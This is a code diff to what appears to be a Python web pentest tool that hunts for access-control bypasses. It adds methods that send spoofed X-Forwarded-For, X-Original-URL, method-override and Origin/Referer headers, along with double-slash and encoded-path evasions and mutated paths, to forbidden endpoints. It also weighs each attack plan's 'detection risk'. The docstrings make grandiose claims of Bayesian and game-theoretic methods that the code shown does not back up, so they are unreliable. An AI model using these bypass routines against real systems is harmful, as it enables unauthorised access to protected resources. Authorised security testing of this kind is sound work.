@@ -30,12 +30,35 @@ import ssl
 import threading
 import gzip
 import queue
+import statistics
+import hashlib
 from collections import defaultdict
 from datetime import datetime
 from urllib.parse import urlparse, urljoin
-from typing import Dict, List, Optional, Tuple
+from typing import Dict, List, Optional, Tuple, Set, Any
 import urllib3
 import warnings
+
+# Import advanced modules
+try:
+    from advanced_bypass_engine import (
+        ResponseDifferentialAnalyzer,
+        BayesianBypassInference,
+        BypassConfidence
+    )
+    from semantic_bypass_engine import (
+        SemanticBypassEngine,
+        AttackVector,
+        EvolutionaryMutationEngine
+    )
+    from graph_attack_planner import (
+        GraphAttackPlanner,
+        AttackCategory
+    )
+    ADVANCED_MODULES_AVAILABLE = True
+except ImportError:
+    ADVANCED_MODULES_AVAILABLE = False
+    print("⚠️  Advanced modules not available - using standard tests only")
 
 # Suppress SSL warnings for security testing
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -2243,6 +2266,34 @@ class DiscrepancyTester:
 
         self.chain_map = {'discrepancies': self.discrepancies}  # Alias for compatibility
 
+        # === ADVANCED MODULES INITIALIZATION ===
+        self.advanced_enabled = ADVANCED_MODULES_AVAILABLE
+        self.differential_analyzer = None
+        self.semantic_engine = None
+        self.attack_planner = None
+
+        if self.advanced_enabled and forbidden_endpoint:
+            try:
+                print("  🧠 Initializing Advanced Bypass Engines...")
+
+                # ResponseDifferentialAnalyzer with Bayesian inference
+                self.differential_analyzer = ResponseDifferentialAnalyzer(
+                    self.session,
+                    self.forbidden_endpoint,
+                    baseline_samples=3
+                )
+
+                # SemanticBypassEngine with evolutionary algorithms
+                self.semantic_engine = SemanticBypassEngine()
+
+                # GraphAttackPlanner with game theory
+                self.attack_planner = GraphAttackPlanner()
+
+                print("  ✅ Advanced engines initialized successfully")
+            except Exception as e:
+                print(f"  ⚠️  Advanced engines initialization failed: {str(e)}")
+                self.advanced_enabled = False
+
     def generate_unique_markers(self) -> Dict[str, str]:
         """Generate unique markers for tracking requests"""
         import uuid
@@ -2442,7 +2493,11 @@ class DiscrepancyTester:
             self.test_protocol_confusion,
             self.test_encoding_confusion,
             self.test_content_type_confusion,
-            self.test_host_header_attacks
+            self.test_host_header_attacks,
+            # === v4.0 REVOLUTIONARY ADVANCED TESTS ===
+            self.test_advanced_response_differential,  # Bayesian + Statistical
+            self.test_semantic_bypass_discovery,       # NLP + Evolutionary
+            self.test_graph_optimized_attack_chain     # Graph Theory + Game Theory
         ]
 
         for test in discrepancy_tests:
@@ -3989,6 +4044,318 @@ class DiscrepancyTester:
                 self.log_discovery("Discrepancy", "Timing Race", f"Timing-dependent responses: {len(set(status_codes))}")
         except:
             pass
+
+    # ========================================================================
+    # ADVANCED BYPASS DISCOVERY METHODS (v4.0 - Revolutionary Techniques)
+    # ========================================================================
+
+    def test_advanced_response_differential(self):
+        """
+        🧠 ADVANCED: Statistical response differential analysis using Bayesian inference.
+
+        Revolutionary technique combining:
+        - Z-score anomaly detection
+        - Shannon entropy analysis
+        - Mahalanobis distance in feature space
+        - Bayesian probability assessment
+        """
+        if not self.advanced_enabled or not self.differential_analyzer:
+            return
+
+        print("\n  🔬 Testing Advanced Response Differential Analysis...")
+        print("     [Bayesian Inference + Statistical Anomaly Detection]")
+
+        # Test suite combining multiple bypass vectors
+        advanced_tests = [
+            {'name': 'Referer Same-Origin', 'headers': {'Referer': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/"}},
+            {'name': 'Origin Null (Sandboxed)', 'headers': {'Origin': 'null'}},
+            {'name': 'X-Forwarded-For Internal', 'headers': {'X-Forwarded-For': '127.0.0.1'}},
+            {'name': 'X-Original-URL Bypass', 'headers': {'X-Original-URL': self.parsed_url.path}},
+            {'name': 'X-HTTP-Method-Override', 'headers': {'X-HTTP-Method-Override': 'GET'}, 'method': 'POST'},
+            {'name': 'Accept JSON Format', 'headers': {'Accept': 'application/json'}},
+            {'name': 'Sec-Fetch-Site Same-Origin', 'headers': {'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'navigate'}},
+        ]
+
+        for test in advanced_tests:
+            try:
+                self.rate_limiter.wait()
+
+                method = test.get('method', 'GET')
+                response = self.session.request(
+                    method=method,
+                    url=self.forbidden_endpoint,
+                    headers=test['headers'],
+                    timeout=10,
+                    allow_redirects=False
+                )
+
+                # Perform advanced statistical analysis
+                analysis = self.differential_analyzer.analyze_response_differential(
+                    response,
+                    test['name'],
+                    test
+                )
+
+                # Check if Bayesian inference suggests bypass
+                if analysis['is_bypass']:
+                    self.discrepancies.append({
+                        'type': 'Advanced Statistical Bypass',
+                        'test_name': test['name'],
+                        'headers': test['headers'],
+                        'response_code': response.status_code,
+                        'bayesian_probability': analysis['bayesian_probability'],
+                        'confidence_level': analysis['confidence_level'],
+                        'severity': 'CRITICAL' if analysis['bayesian_probability'] > 0.85 else 'HIGH',
+                        'evidence': analysis['summary'],
+                        'detailed_findings': analysis['findings'],
+                        'bayesian_explanation': analysis['bayesian_explanation']
+                    })
+
+                    print(f"    [!] 🎯 BYPASS DETECTED: {test['name']}")
+                    print(f"        Probability: {analysis['bayesian_probability']:.2%}")
+                    print(f"        Confidence: {analysis['confidence_level']}")
+
+                elif analysis['findings']:
+                    # Interesting differential even if not confirmed bypass
+                    print(f"    [~] Differential detected: {test['name']} ({len(analysis['findings'])} anomalies)")
+
+            except Exception as e:
+                pass
+
+    def test_semantic_bypass_discovery(self):
+        """
+        🧬 ADVANCED: Semantic error analysis with evolutionary payload generation.
+
+        Revolutionary technique combining:
+        - NLP-inspired error classification
+        - Evolutionary algorithms for mutation
+        - Fuzzy logic for pattern matching
+        - Attack vector ontology
+        """
+        if not self.advanced_enabled or not self.semantic_engine:
+            return
+
+        print("\n  🧬 Testing Semantic Bypass Discovery...")
+        print("     [NLP + Evolutionary Algorithms]")
+
+        # Get baseline error for semantic analysis
+        try:
+            baseline_response = self.session.get(
+                self.forbidden_endpoint,
+                timeout=10,
+                allow_redirects=False
+            )
+
+            # Classify error semantically
+            semantic_analysis = self.semantic_engine.analyze_response_semantics(
+                baseline_response.text,
+                dict(baseline_response.headers),
+                baseline_response.status_code
+            )
+
+            print(f"     Error Classification: {semantic_analysis['classification']['primary_classification']['type'] if semantic_analysis['classification']['primary_classification'] else 'Unknown'}")
+            print(f"     Bypassability Score: {semantic_analysis['is_bypassable']:.2%}")
+            print(f"     Suggested Vectors: {', '.join([v.value for v in semantic_analysis['suggested_vectors'][:3]])}")
+
+            # Generate evolved bypass payloads
+            if semantic_analysis['suggested_vectors']:
+                print("\n     Generating evolved bypass mutations...")
+
+                base_path = self.parsed_url.path
+                evolved_candidates = self.semantic_engine.generate_evolved_bypasses(
+                    base_path,
+                    max_generations=2  # 2 generations for efficiency
+                )
+
+                print(f"     Generated {len(evolved_candidates)} mutation candidates")
+
+                # Test top evolved candidates
+                for candidate in evolved_candidates[:10]:  # Test top 10
+                    self.rate_limiter.wait()
+
+                    test_path = candidate['payload']
+                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{test_path}"
+
+                    try:
+                        response = self.session.get(test_url, timeout=5, allow_redirects=False)
+
+                        if response.status_code not in [401, 403, 404, 429]:
+                            self.discrepancies.append({
+                                'type': 'Semantic Evolutionary Bypass',
+                                'mutation_operator': candidate['operator'],
+                                'generation': candidate['generation'],
+                                'original_payload': base_path,
+                                'evolved_payload': test_path,
+                                'response_code': response.status_code,
+                                'severity': 'HIGH' if response.status_code == 200 else 'MEDIUM',
+                                'evidence': f"Evolved payload bypassed via {candidate['operator']}"
+                            })
+
+                            print(f"    [!] 🧬 Evolutionary Bypass: {candidate['operator']} -> {response.status_code}")
+
+                            # Learn from success
+                            if semantic_analysis['suggested_vectors']:
+                                self.semantic_engine.learn_from_success(
+                                    semantic_analysis['suggested_vectors'][0],
+                                    test_path,
+                                    {'differential_score': 1.0}
+                                )
+
+                    except:
+                        continue
+
+        except Exception as e:
+            print(f"     ⚠️  Semantic analysis error: {str(e)}")
+
+    def test_graph_optimized_attack_chain(self):
+        """
+        🎯 ADVANCED: Graph-theoretical attack chain optimization.
+
+        Revolutionary technique combining:
+        - A* search for optimal path finding
+        - Game theory for strategy optimization
+        - Dynamic programming for memoization
+        - Nash equilibrium for technique mixing
+        """
+        if not self.advanced_enabled or not self.attack_planner:
+            return
+
+        print("\n  🎯 Testing Graph-Optimized Attack Chains...")
+        print("     [A* Search + Game Theory + Nash Equilibrium]")
+
+        # Plan optimal attack sequence
+        attack_plan = self.attack_planner.plan_attack_sequence()
+
+        if not attack_plan['success']:
+            print(f"     ⚠️  No viable attack path found")
+            return
+
+        print(f"\n     📊 Optimal Attack Plan Generated:")
+        print(f"        Path Length: {len(attack_plan['optimal_path'])} techniques")
+        print(f"        Success Probability: {attack_plan['optimal_path_details']['success_probability']:.2%}")
+        print(f"        Detection Risk: {attack_plan['optimal_path_details']['detection_risk']:.2%}")
+        print(f"        Expected Value: {attack_plan['optimal_path_details']['expected_value']:.2f}")
+
+        print(f"\n     🔗 Attack Chain:")
+        for i, technique_name in enumerate(attack_plan['optimal_path_details']['techniques'], 1):
+            print(f"        {i}. {technique_name}")
+
+        # Execute techniques from attack plan
+        print(f"\n     Executing optimal attack chain...")
+
+        technique_mapping = {
+            'Header Manipulation': self._execute_header_manipulation,
+            'Path Traversal': self._execute_path_traversal,
+            'HTTP Method Override': self._execute_method_override,
+            'Encoding Evasion': self._execute_encoding_evasion,
+            'Referer/Origin Spoofing': self._execute_referer_spoofing,
+        }
+
+        execution_feedback = {}
+
+        for technique_id in attack_plan['optimal_path'][1:-1]:  # Skip start and end nodes
+            node = self.attack_planner.graph.nodes[technique_id]
+            technique_name = node.name
+
+            if technique_name in technique_mapping:
+                try:
+                    result = technique_mapping[technique_name]()
+                    execution_feedback[technique_id] = result
+
+                    if result.get('success'):
+                        print(f"    [✓] {technique_name}: Success")
+                    else:
+                        print(f"    [✗] {technique_name}: Failed")
+
+                except Exception as e:
+                    execution_feedback[technique_id] = {'success': False, 'error': str(e)}
+                    print(f"    [✗] {technique_name}: Error - {str(e)}")
+
+        # Adaptive replanning based on feedback
+        if execution_feedback:
+            print(f"\n     🔄 Adaptive Replanning...")
+            adapted_plan = self.attack_planner.execute_plan_with_adaptation(
+                attack_plan,
+                execution_feedback
+            )
+
+            if adapted_plan['optimal_path'] != attack_plan['optimal_path']:
+                print(f"        Strategy adapted based on execution feedback")
+                print(f"        New success probability: {adapted_plan['optimal_path_details']['success_probability']:.2%}")
+
+    # Helper methods for graph attack chain execution
+    def _execute_header_manipulation(self) -> Dict:
+        """Execute header manipulation technique"""
+        try:
+            self.rate_limiter.wait()
+            response = self.session.get(
+                self.forbidden_endpoint,
+                headers={'X-Forwarded-For': '127.0.0.1', 'X-Original-URL': '/'},
+                timeout=5
+            )
+            success = response.status_code not in [401, 403, 429]
+            return {'success': success, 'status_code': response.status_code}
+        except:
+            return {'success': False}
+
+    def _execute_path_traversal(self) -> Dict:
+        """Execute path traversal technique"""
+        try:
+            self.rate_limiter.wait()
+            test_path = self.parsed_url.path.replace('/', '//')
+            response = self.session.get(
+                f"{self.target_url}{test_path}",
+                timeout=5
+            )
+            success = response.status_code not in [401, 403, 429]
+            return {'success': success, 'status_code': response.status_code}
+        except:
+            return {'success': False}
+
+    def _execute_method_override(self) -> Dict:
+        """Execute method override technique"""
+        try:
+            self.rate_limiter.wait()
+            response = self.session.post(
+                self.forbidden_endpoint,
+                headers={'X-HTTP-Method-Override': 'GET'},
+                timeout=5
+            )
+            success = response.status_code not in [401, 403, 429]
+            return {'success': success, 'status_code': response.status_code}
+        except:
+            return {'success': False}
+
+    def _execute_encoding_evasion(self) -> Dict:
+        """Execute encoding evasion technique"""
+        try:
+            self.rate_limiter.wait()
+            encoded_path = urllib.parse.quote(self.parsed_url.path, safe='')
+            response = self.session.get(
+                f"{self.target_url}{encoded_path}",
+                timeout=5
+            )
+            success = response.status_code not in [401, 403, 429]
+            return {'success': success, 'status_code': response.status_code}
+        except:
+            return {'success': False}
+
+    def _execute_referer_spoofing(self) -> Dict:
+        """Execute referer/origin spoofing technique"""
+        try:
+            self.rate_limiter.wait()
+            response = self.session.get(
+                self.forbidden_endpoint,
+                headers={
+                    'Referer': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/",
+                    'Origin': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
+                },
+                timeout=5
+            )
+            success = response.status_code not in [401, 403, 429]
+            return {'success': success, 'status_code': response.status_code}
+        except:
+            return {'success': False}
 
 
 class BypassGenerator:
